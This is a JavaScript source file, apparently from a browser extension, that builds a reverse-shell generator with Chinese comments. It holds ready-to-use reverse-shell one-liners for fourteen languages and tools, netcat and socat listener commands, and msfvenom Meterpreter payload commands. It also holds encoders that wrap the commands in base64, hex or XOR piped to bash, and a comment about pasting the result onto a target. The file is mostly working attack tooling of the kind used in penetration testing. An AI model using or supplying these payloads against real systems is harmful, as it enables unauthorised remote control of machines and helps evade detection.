/**
 * 反向Shell生成器
 * - 多种语言/Shell类型的反向Shell命令生成
 * - 支持一键复制和全部生成
 * @version 1.3.0
 */
(function () {
  'use strict';

  // Reverse shell templates - {LHOST} and {LPORT} will be replaced
  var shellTemplates = [
    {
      id: 'bash',
      name: 'Bash',
      cmd: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
    },
    {
      id: 'python',
      name: 'Python',
      cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
    },
    {
      id: 'perl',
      name: 'Perl',
      cmd: 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
    },
    {
      id: 'php',
      name: 'PHP',
      cmd: 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\''
    },
    {
      id: 'ruby',
      name: 'Ruby',
      cmd: 'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
    },
    {
      id: 'nc',
      name: 'Netcat',
      cmd: 'nc -e /bin/sh {LHOST} {LPORT}'
    },
    {
      id: 'powershell',
      name: 'PowerShell',
      cmd: "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    },
    {
      id: 'java',
      name: 'Java',
      cmd: 'Runtime rt = Runtime.getRuntime();String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"};rt.exec(cmd);'
    },
    {
      id: 'socat',
      name: 'Socat',
      cmd: 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}'
    },
    {
      id: 'nodejs',
      name: 'Node.js',
      cmd: "require('net').connect({LPORT},'{LHOST}',function(){this.pipe(require('child_process').exec('bash',{stdio:[this,this,this]})).pipe(this)})"
    },
    {
      id: 'xterm',
      name: 'xterm',
      cmd: 'xterm -display {LHOST}:{LPORT}'
    },
    {
      id: 'lua',
      name: 'Lua',
      cmd: 'lua -e \'require("socket");require("os");t=socket.tcp();t:connect("{LHOST}","{LPORT}");os.execute(\'/bin/sh -i <&3 >&3 2>&3\');\''
    },
    {
      id: 'go',
      name: 'Go',
      cmd: 'package main\nimport ("os/exec";"net");func main(){c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'
    },
    {
      id: 'awk',
      name: 'Awk',
      cmd: "awk 'BEGIN{s=\"/inet/tcp/0/{LHOST}/{LPORT}\";while(1){do{printf\"$ \"|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!=\"exit\")}}'"
    }
  ];

  // State
  var currentShell = 'bash';
  var showAll = false;
  var currentEncoding = 'none';

  // 监听命令模板
  var listenerTemplates = [
    { id: 'nc', name: 'Netcat', cmd: 'nc -lvnp {LPORT}' },
    { id: 'ncat', name: 'Ncat (SSL)', cmd: 'ncat --ssl -lvnp {LPORT}' },
    { id: 'socat-l', name: 'Socat', cmd: 'socat file:`tty`,raw,echo=0 tcp-listen:{LPORT},reuseaddr,fork' },
    { id: 'pwncat', name: 'Pwncat', cmd: 'python3 -m pwncat -lp {LPORT}' },
    { id: 'rlwrap', name: 'RLWrap NC', cmd: 'rlwrap nc -lvnp {LPORT}' }
  ];

  // MSFVenom模板
  var msfTemplates = [
    { id: 'msf-py', name: 'Python Meterpreter', cmd: 'msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw' },
    { id: 'msf-exe', name: 'Windows EXE', cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe' },
    { id: 'msf-elf', name: 'Linux ELF', cmd: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf' },
    { id: 'msf-jsp', name: 'JSP', cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.jsp' },
    { id: 'msf-php', name: 'PHP', cmd: 'msfvenom -p php/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw' }
  ];

  // 编码函数
  function applyEncoding(cmd, encoding) {
    switch (encoding) {
      case 'base64':
        try { return 'echo ' + btoa(cmd) + ' | base64 -d | bash'; } catch(e) { return cmd; }
      case 'url':
        return encodeURIComponent(cmd);
      case 'hex':
        return "echo '" + cmd.split('').map(function(c) { return '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'); }).join('') + "' | xxd -r -p | bash";
      case 'xor':
        // 简单XOR演示，用0x42做异或
        var xorKey = 0x42;
        var encoded = cmd.split('').map(function(c) { return String.fromCharCode(c.charCodeAt(0) ^ xorKey); }).join('');
        try { return "echo '" + btoa(encoded) + "' | base64 -d | python3 -c \"import sys;key=0x42;sys.stdout.write(''.join(chr(ord(c)^key) for c in sys.stdin.read()))\" | bash"; } catch(e) { return cmd; }
      default:
        return cmd;
    }
  }

  // DOM elements
  var E = {
    lhostInput: document.getElementById('lhost-input'),
    lportInput: document.getElementById('lport-input'),
    shellTabs: document.getElementById('shell-tabs'),
    btnGenerateAll: document.getElementById('btn-generate-all'),
    outputSection: document.getElementById('output-section'),
    singleOutput: document.getElementById('single-output'),
    allOutput: document.getElementById('all-output'),
    outputTitle: document.getElementById('output-title'),
    outputCode: document.getElementById('output-code'),
    btnCopy: document.getElementById('btn-copy'),
    toast: document.getElementById('toast')
  };
  function isCtxValid() { try { return !!(chrome && chrome.runtime && chrome.runtime.id); } catch(e) { return false; } }
  function safeSend(msg) { if (!isCtxValid()) return Promise.resolve(); return chrome.runtime.sendMessage(msg).catch(() => {}); }
  // ============ Generate Command ============

  function generateCommand(template) {
    var lhost = E.lhostInput.value.trim() || '{LHOST}';
    var lport = E.lportInput.value.trim() || '4444';
    var cmd = template.cmd.replace(/\{LHOST\}/g, lhost).replace(/\{LPORT\}/g, lport);
    // 应用编码
    var encSelect = document.getElementById('encoding-select');
    if (encSelect) currentEncoding = encSelect.value;
    if (currentEncoding && currentEncoding !== 'none') {
      cmd = applyEncoding(cmd, currentEncoding);
    }
    return cmd;
  }

  function generateListenerCommand(template) {
    var lport = E.lportInput.value.trim() || '4444';
    return template.cmd.replace(/\{LPORT\}/g, lport);
  }

  function generateMsfCommand(template) {
    var lhost = E.lhostInput.value.trim() || '{LHOST}';
    var lport = E.lportInput.value.trim() || '4444';
    return template.cmd.replace(/\{LHOST\}/g, lhost).replace(/\{LPORT\}/g, lport);
  }

  function getCurrentTemplate() {
    for (var i = 0; i < shellTemplates.length; i++) {
      if (shellTemplates[i].id === currentShell) return shellTemplates[i];
    }
    return shellTemplates[0];
  }

  function updateOutput() {
    if (showAll) {
      updateAllOutput();
    } else {
      updateSingleOutput();
    }
  }

  function updateSingleOutput() {
    var tmpl = getCurrentTemplate();
    E.outputTitle.textContent = tmpl.name;
    E.outputCode.textContent = generateCommand(tmpl);
  }

  function updateAllOutput() {
    var html = '';
    for (var i = 0; i < shellTemplates.length; i++) {
      var tmpl = shellTemplates[i];
      var cmd = generateCommand(tmpl);
      html += '<div class="all-output-item">' +
        '<div class="all-output-header">' +
          '<span class="all-output-name">' + escapeHtml(tmpl.name) + '</span>' +
          '<button class="btn btn--copy" data-copy-idx="' + i + '" title="复制命令">&#128203; 复制</button>' +
        '</div>' +
        '<pre class="all-output-code">' + escapeHtml(cmd) + '</pre>' +
      '</div>';
    }
    E.allOutput.innerHTML = html;
  }

  // ============ Render Tabs ============

  function renderTabs() {
    var html = '';
    for (var i = 0; i < shellTemplates.length; i++) {
      var tmpl = shellTemplates[i];
      var activeClass = tmpl.id === currentShell ? ' shell-tab--active' : '';
      html += '<button class="shell-tab' + activeClass + '" data-shell="' + tmpl.id + '">' + escapeHtml(tmpl.name) + '</button>';
    }
    E.shellTabs.innerHTML = html;
  }

  // ============ Toast ============

  function showToast(msg, type) {
    type = type || 'info';
    E.toast.textContent = msg;
    E.toast.className = 'toast toast--' + type + ' toast--show';
    setTimeout(function () {
      E.toast.classList.remove('toast--show');
    }, 3000);
  }

  // ============ Save to History ============

  function saveToHistory(input, action) {
    try {
      safeSend({
        action: 'saveToHistory',
        data: { toolId: 'reverse-shell-generator', type: action, data: { shell: input, action: action } }
      });
    } catch (e) {}
  }

  // ============ Utility ============

  function escapeHtml(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
      return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c];
    });
  }

  // ============ Event Bindings ============

  // Tab clicks
  E.shellTabs.addEventListener('click', function (e) {
    var tab = e.target.closest('.shell-tab');
    if (!tab) return;
    currentShell = tab.dataset.shell;
    showAll = false;
    E.singleOutput.style.display = '';
    E.allOutput.style.display = 'none';
    renderTabs();
    updateOutput();
  });

  // Copy single
  E.btnCopy.addEventListener('click', function () {
    var text = E.outputCode.textContent;
    if (!text) return;
    navigator.clipboard.writeText(text).then(function () {
      showToast('已复制', 'success');
      saveToHistory(currentShell, 'copy');
    }).catch(function () {
      showToast('复制失败', 'error');
    });
  });

  // 复制并 Base64 编码（直接复制 base64 字符串，便于粘贴到目标执行）
  var btnCopyB64 = document.getElementById('btn-copy-b64');
  if (btnCopyB64) {
    btnCopyB64.addEventListener('click', function () {
      var text = E.outputCode.textContent;
      if (!text) return;
      try {
        // 处理 Unicode：先 UTF-8 编码再 base64
        var b64 = btoa(unescape(encodeURIComponent(text)));
        navigator.clipboard.writeText(b64).then(function () {
          showToast('已复制 Base64: ' + b64.substring(0, 24) + (b64.length > 24 ? '...' : ''), 'success');
          saveToHistory(currentShell, 'copy-b64');
        }).catch(function () {
          showToast('复制失败', 'error');
        });
      } catch (e) {
        showToast('Base64 编码失败', 'error');
      }
    });
  }

  // 快速 IP/端口预设按钮
  var quickPresets = document.getElementById('quick-presets');
  if (quickPresets) {
    quickPresets.addEventListener('click', function (e) {
      var btn = e.target.closest('.preset-btn');
      if (!btn) return;
      var lhost = btn.dataset.lhost;
      var lport = btn.dataset.lport;
      if (lhost) E.lhostInput.value = lhost;
      if (lport) E.lportInput.value = lport;
      updateOutput();
      showToast('已设置 ' + (lhost || '') + (lhost && lport ? ':' : '') + (lport || ''), 'info');
    });
  }

  // Copy in all-output mode (event delegation)
  E.allOutput.addEventListener('click', function (e) {
    var btn = e.target.closest('[data-copy-idx]');
    if (!btn) return;
    var idx = parseInt(btn.dataset.copyIdx, 10);
    if (idx >= 0 && idx < shellTemplates.length) {
      var cmd = generateCommand(shellTemplates[idx]);
      navigator.clipboard.writeText(cmd).then(function () {
        showToast(shellTemplates[idx].name + ' 已复制', 'success');
        saveToHistory(shellTemplates[idx].id, 'copy');
      }).catch(function () {
        showToast('复制失败', 'error');
      });
    }
  });

  // Generate all
  E.btnGenerateAll.addEventListener('click', function () {
    showAll = true;
    E.singleOutput.style.display = 'none';
    E.allOutput.style.display = '';
    // Deselect tabs visually
    var tabs = E.shellTabs.querySelectorAll('.shell-tab');
    for (var i = 0; i < tabs.length; i++) {
      tabs[i].classList.remove('shell-tab--active');
    }
    updateAllOutput();
  });

  // Input changes -> live update
  E.lhostInput.addEventListener('input', updateOutput);
  E.lportInput.addEventListener('input', updateOutput);

  // 编码选择
  var encSelect = document.getElementById('encoding-select');
  if (encSelect) encSelect.addEventListener('change', function() { currentEncoding = this.value; updateOutput(); });

  // 监听命令区域
  var listenerSection = document.getElementById('listener-section');
  var listenerOutput = document.getElementById('listener-output');
  if (listenerSection && listenerOutput) {
    function updateListeners() {
      var html = '';
      for (var i = 0; i < listenerTemplates.length; i++) {
        var tmpl = listenerTemplates[i];
        html += '<div class="all-output-item"><div class="all-output-header"><span class="all-output-name">' + escapeHtml(tmpl.name) + '</span><button class="btn btn--copy" data-listener-idx="' + i + '" title="复制命令">&#128203; 复制</button></div><pre class="all-output-code">' + escapeHtml(generateListenerCommand(tmpl)) + '</pre></div>';
      }
      listenerOutput.innerHTML = html;
    }
    updateListeners();
    E.lportInput.addEventListener('input', updateListeners);
    // 监听命令复制
    listenerOutput.addEventListener('click', function(e) {
      var btn = e.target.closest('[data-listener-idx]');
      if (!btn) return;
      var idx = parseInt(btn.dataset.listenerIdx, 10);
      if (idx >= 0 && idx < listenerTemplates.length) {
        var cmd = generateListenerCommand(listenerTemplates[idx]);
        navigator.clipboard.writeText(cmd).then(function() { showToast(listenerTemplates[idx].name + ' 已复制', 'success'); }).catch(function() { showToast('复制失败', 'error'); });
      }
    });
  }

  // MSFVenom区域
  var msfSection = document.getElementById('msf-section');
  var msfOutput = document.getElementById('msf-output');
  if (msfSection && msfOutput) {
    function updateMsf() {
      var html = '';
      for (var i = 0; i < msfTemplates.length; i++) {
        var tmpl = msfTemplates[i];
        html += '<div class="all-output-item"><div class="all-output-header"><span class="all-output-name">' + escapeHtml(tmpl.name) + '</span><button class="btn btn--copy" data-msf-idx="' + i + '" title="复制命令">&#128203; 复制</button></div><pre class="all-output-code">' + escapeHtml(generateMsfCommand(tmpl)) + '</pre></div>';
      }
      msfOutput.innerHTML = html;
    }
    updateMsf();
    E.lhostInput.addEventListener('input', updateMsf);
    E.lportInput.addEventListener('input', updateMsf);
    msfOutput.addEventListener('click', function(e) {
      var btn = e.target.closest('[data-msf-idx]');
      if (!btn) return;
      var idx = parseInt(btn.dataset.msfIdx, 10);
      if (idx >= 0 && idx < msfTemplates.length) {
        var cmd = generateMsfCommand(msfTemplates[idx]);
        navigator.clipboard.writeText(cmd).then(function() { showToast(msfTemplates[idx].name + ' 已复制', 'success'); }).catch(function() { showToast('复制失败', 'error'); });
      }
    });
  }

  // ============ Init ============

  document.addEventListener('DOMContentLoaded', function () {
    renderTabs();
    updateOutput();
  });

  // ============ Message Listener (theme / setData) ============

  window.addEventListener('message', function (event) {
      if (event.origin !== location.origin) return; // 只接受来自本扩展的页面（防止被第三方站点嵌入后驱动）

    if (!event.data || event.source !== window.parent) return;
    if (event.data.action === 'setTheme' && event.data.data) {
      document.documentElement.setAttribute('data-theme', event.data.data.theme);
    }
    if (event.data.action === 'setData' && typeof event.data.data === 'string') {
      E.lhostInput.value = event.data.data;
      updateOutput();
    }
  });

  // Also run init immediately in case DOMContentLoaded already fired
  renderTabs();
  updateOutput();
})();
